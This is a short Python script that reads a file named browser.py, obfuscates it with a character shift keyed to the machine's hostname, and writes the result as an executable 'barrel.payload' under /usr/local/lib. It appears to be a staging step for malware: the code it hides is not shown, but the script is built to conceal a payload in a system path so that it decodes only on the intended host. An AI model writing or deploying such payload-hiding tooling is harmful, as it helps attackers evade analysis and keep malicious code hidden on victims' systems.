#!/bin/env python3
import socket,os

word = socket.gethostname()
key = ord(word[-1])
file_path = "/usr/local/lib/barrel/barrel.payload"

# Find the browser.py script in the working dir
with open("./browser.py") as source:
    lines = source.readlines()
source.close()

# Obfuscate based on hostname. Place obfuscated script under /usr/local/lib/
with open(file_path, "w") as payload:
    for line in lines:
        for ch in line:
            payload.write(chr(ord(ch)+key))
payload.close()
os.chmod(file_path,0o755)
